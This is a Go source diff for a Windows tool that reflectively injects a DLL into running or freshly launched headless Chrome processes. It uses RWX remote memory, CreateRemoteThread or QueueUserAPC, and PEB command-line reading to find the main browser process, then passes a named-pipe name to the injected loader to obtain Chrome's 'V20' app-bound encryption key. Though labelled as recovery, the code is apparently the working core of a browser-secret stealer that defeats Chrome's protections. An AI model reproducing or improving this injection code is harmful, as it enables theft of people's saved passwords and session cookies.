@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 	"syscall"
 	"unsafe"
 
@@ -15,12 +16,95 @@ import (
 )
 
 var (
-	modKernel32Inj         = windows.NewLazySystemDLL("kernel32.dll")
-	procVirtualAllocEx     = modKernel32Inj.NewProc("VirtualAllocEx")
-	procVirtualFreeEx      = modKernel32Inj.NewProc("VirtualFreeEx")
-	procCreateRemoteThread = modKernel32Inj.NewProc("CreateRemoteThread")
-	procQueueUserAPC       = modKernel32Inj.NewProc("QueueUserAPC")
+	modKernel32Inj                = windows.NewLazySystemDLL("kernel32.dll")
+	procVirtualAllocEx            = modKernel32Inj.NewProc("VirtualAllocEx")
+	procVirtualFreeEx             = modKernel32Inj.NewProc("VirtualFreeEx")
+	procCreateRemoteThread        = modKernel32Inj.NewProc("CreateRemoteThread")
+	procQueueUserAPC              = modKernel32Inj.NewProc("QueueUserAPC")
+	modNtdllInj                   = windows.NewLazySystemDLL("ntdll.dll")
+	procNtQueryInformationProcess = modNtdllInj.NewProc("NtQueryInformationProcess")
 )
+
+// processBasicInformation mirrors PROCESS_BASIC_INFORMATION (x64).
+type processBasicInformation struct {
+	Reserved1       uintptr
+	PebBaseAddress  uintptr
+	Reserved2       [2]uintptr
+	UniqueProcessId uintptr
+	Reserved3       uintptr
+}
+
+// unicodeString mirrors UNICODE_STRING.
+type unicodeString struct {
+	Length        uint16
+	MaximumLength uint16
+	Buffer        uintptr
+}
+
+// processCommandLine returns the full command line of a process by walking its
+// PEB (x64 offsets). Used to distinguish the main browser process from its
+// renderer/GPU/utility subprocesses.
+func processCommandLine(pid uint32) (string, error) {
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_QUERY_LIMITED_INFORMATION|windows.PROCESS_VM_READ, false, pid)
+	if err != nil {
+		return "", err
+	}
+	defer windows.CloseHandle(hProcess)
+
+	var pbi processBasicInformation
+	var retLen uint32
+	status, _, _ := procNtQueryInformationProcess.Call(
+		uintptr(hProcess), 0, uintptr(unsafe.Pointer(&pbi)),
+		unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&retLen)),
+	)
+	if status != 0 || pbi.PebBaseAddress == 0 {
+		return "", fmt.Errorf("NtQueryInformationProcess: 0x%x", status)
+	}
+
+	// PEB.ProcessParameters (offset 0x20 on x64).
+	var procParams uintptr
+	if err := windows.ReadProcessMemory(hProcess, pbi.PebBaseAddress+0x20,
+		(*byte)(unsafe.Pointer(&procParams)), unsafe.Sizeof(procParams), nil); err != nil {
+		return "", err
+	}
+	if procParams == 0 {
+		return "", fmt.Errorf("no process parameters")
+	}
+
+	// RTL_USER_PROCESS_PARAMETERS.CommandLine (offset 0x70 on x64).
+	var cmdLine unicodeString
+	if err := windows.ReadProcessMemory(hProcess, procParams+0x70,
+		(*byte)(unsafe.Pointer(&cmdLine)), unsafe.Sizeof(cmdLine), nil); err != nil {
+		return "", err
+	}
+	if cmdLine.Length == 0 || cmdLine.Buffer == 0 {
+		return "", fmt.Errorf("no command line")
+	}
+
+	buf := make([]uint16, cmdLine.Length/2)
+	if err := windows.ReadProcessMemory(hProcess, cmdLine.Buffer,
+		(*byte)(unsafe.Pointer(&buf[0])), uintptr(cmdLine.Length), nil); err != nil {
+		return "", err
+	}
+	return syscall.UTF16ToString(buf), nil
+}
+
+func orderedBrowserPIDs(exeName string) []uint32 {
+	pids, err := FindProcesses(exeName)
+	if err != nil || len(pids) <= 1 {
+		return pids
+	}
+	for i, pid := range pids {
+		if cmdline, err := processCommandLine(pid); err == nil && !strings.Contains(cmdline, "--type=") {
+			if i != 0 {
+				pids[0], pids[i] = pids[i], pids[0]
+			}
+			return pids
+		}
+	}
+	return pids
+}
 
 // findReflectiveLoaderOffset parses the PE export table in file layout and
 // returns the file offset of the ReflectiveLoader export function.
@@ -155,16 +239,26 @@ func findReflectiveLoaderOffset(pe []byte) (uint32, error) {
 	return 0, fmt.Errorf("ReflectiveLoader export not found")
 }
 
-// writeReflectiveDLL allocates RWX memory in hProcess, writes the full DLL image,
-// and returns the remote address of the ReflectiveLoader entry point.
-func writeReflectiveDLL(hProcess windows.Handle, dllBytes []byte) (loaderAddr uintptr, remoteMem uintptr, err error) {
+// writeReflectiveDLL allocates RWX memory in hProcess, writes the full DLL image
+// followed by the UTF-16 pipe name, and returns the remote addresses of the
+// ReflectiveLoader entry point and the pipe name. The pipe name is passed to
+// the loader as lpParameter so it reaches DllMain without relying on an
+// inherited environment variable (which running browsers do not have).
+func writeReflectiveDLL(hProcess windows.Handle, dllBytes []byte, pipeName string) (loaderAddr, pipeNameAddr uintptr, err error) {
 	loaderOff, err := findReflectiveLoaderOffset(dllBytes)
 	if err != nil {
 		return 0, 0, fmt.Errorf("find reflective loader: %w", err)
 	}
 
-	remoteMem, _, _ = procVirtualAllocEx.Call(
-		uintptr(hProcess), 0, uintptr(len(dllBytes)),
+	pipeW, err := syscall.UTF16FromString(pipeName)
+	if err != nil {
+		return 0, 0, fmt.Errorf("utf16 pipe name: %w", err)
+	}
+	pipeBytes := len(pipeW) * 2
+	total := len(dllBytes) + pipeBytes
+
+	remoteMem, _, _ := procVirtualAllocEx.Call(
+		uintptr(hProcess), 0, uintptr(total),
 		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE,
 	)
 	if remoteMem == 0 {
@@ -177,7 +271,14 @@ func writeReflectiveDLL(hProcess windows.Handle, dllBytes []byte) (loaderAddr ui
 		return 0, 0, fmt.Errorf("WriteProcessMemory: %w", err)
 	}
 
-	return remoteMem + uintptr(loaderOff), remoteMem, nil
+	pipeNameAddr = remoteMem + uintptr(len(dllBytes))
+	pipeBuf := unsafe.Slice((*byte)(unsafe.Pointer(&pipeW[0])), pipeBytes)
+	if err := windows.WriteProcessMemory(hProcess, pipeNameAddr, &pipeBuf[0], uintptr(pipeBytes), &written); err != nil {
+		procVirtualFreeEx.Call(uintptr(hProcess), remoteMem, 0, windows.MEM_RELEASE)
+		return 0, 0, fmt.Errorf("WriteProcessMemory pipe: %w", err)
+	}
+
+	return remoteMem + uintptr(loaderOff), pipeNameAddr, nil
 }
 
 func createKillOnCloseJob() (windows.Handle, error) {
@@ -207,13 +308,13 @@ func InjectDLL(dllBytes []byte, pipeName string, targetPID uint32) (*PipeSession
 		return nil, fmt.Errorf("OpenProcess(%d): %w", targetPID, err)
 	}
 
-	loaderAddr, _, err := writeReflectiveDLL(hProcess, dllBytes)
+	loaderAddr, pipeNameAddr, err := writeReflectiveDLL(hProcess, dllBytes, pipeName)
 	if err != nil {
 		windows.CloseHandle(hProcess)
 		return nil, err
 	}
 
-	hThread, _, lerr := procCreateRemoteThread.Call(uintptr(hProcess), 0, 0, loaderAddr, 0, 0, 0)
+	hThread, _, lerr := procCreateRemoteThread.Call(uintptr(hProcess), 0, 0, loaderAddr, pipeNameAddr, 0, 0)
 	if hThread == 0 {
 		windows.CloseHandle(hProcess)
 		return nil, fmt.Errorf("CreateRemoteThread: %w", lerr)
@@ -233,26 +334,20 @@ func cleanupInjection(hProcess windows.Handle, addr uintptr) {
 	windows.CloseHandle(hProcess)
 }
 
-// CreatePipeSession creates a named pipe, sets the env var, reflectively injects
-// the DLL into an existing browser process, and waits for connection.
-// Falls back to creating a new headless browser process if injection into
-// an existing process fails or times out.
+// CreatePipeSession creates a named pipe, reflectively injects the DLL into an
+// existing browser process (passing the pipe name via lpParameter), and waits
+// for connection. Falls back to creating a new headless browser process if
+// injection into an existing process fails or times out.
 func CreatePipeSession(dllBytes []byte, browserName string) (*PipeSession, error) {
 	pipeName := createPipeName()
 	logf("creating pipe: %s", pipeName)
-
-	windows.SetEnvironmentVariable(syscall.StringToUTF16Ptr("RECOVERY_PIPE"), syscall.StringToUTF16Ptr(pipeName))
 
 	hPipe, err := createPipeServer(pipeName)
 	if err != nil {
 		return nil, fmt.Errorf("create pipe server: %w", err)
 	}
 
-	pids, err := FindProcesses(BrowserExeName(browserName))
-	if err != nil {
-		windows.CloseHandle(hPipe)
-		return nil, err
-	}
+	pids := orderedBrowserPIDs(BrowserExeName(browserName))
 
 	const maxExistingTries = 3
 	if len(pids) > 0 {
@@ -401,14 +496,14 @@ func CreateAndInjectBrowser(dllBytes []byte, pipeName string, browserName string
 		windows.CloseHandle(pi.Thread)
 	}
 
-	loaderAddr, _, err := writeReflectiveDLL(pi.Process, dllBytes)
+	loaderAddr, pipeNameAddr, err := writeReflectiveDLL(pi.Process, dllBytes, pipeName)
 	if err != nil {
 		cleanup()
 		return nil, err
 	}
 
 	// Queue APC to the main thread — fires on its first alertable wait after resume.
-	ret, _, aerr := procQueueUserAPC.Call(loaderAddr, uintptr(pi.Thread), 0)
+	ret, _, aerr := procQueueUserAPC.Call(loaderAddr, uintptr(pi.Thread), pipeNameAddr)
 	if ret == 0 {
 		cleanup()
 		return nil, fmt.Errorf("QueueUserAPC: %w", aerr)
@@ -468,7 +563,7 @@ func TryV20KeyViaBrowserSession(processName, browserName string, encBlob []byte)
 		return nil, fmt.Errorf("no embedded DLL")
 	}
 
-	pids, _ := FindProcesses(processName)
+	pids := orderedBrowserPIDs(processName)
 	if len(pids) == 0 && browserName == "Chrome" {
 		return nil, fmt.Errorf("no running Chrome processes for V20")
 	}
@@ -517,7 +612,6 @@ func TryV20KeyViaBrowserSession(processName, browserName string, encBlob []byte)
 	}
 
 	logf("existing %s PIDs failed for V20, launching headless process", browserName)
-	windows.SetEnvironmentVariable(syscall.StringToUTF16Ptr("RECOVERY_PIPE"), syscall.StringToUTF16Ptr(pipeName))
 	s, err := CreateAndInjectBrowser(dllBytes, pipeName, browserName)
 	if err != nil {
 		windows.CloseHandle(hPipe)
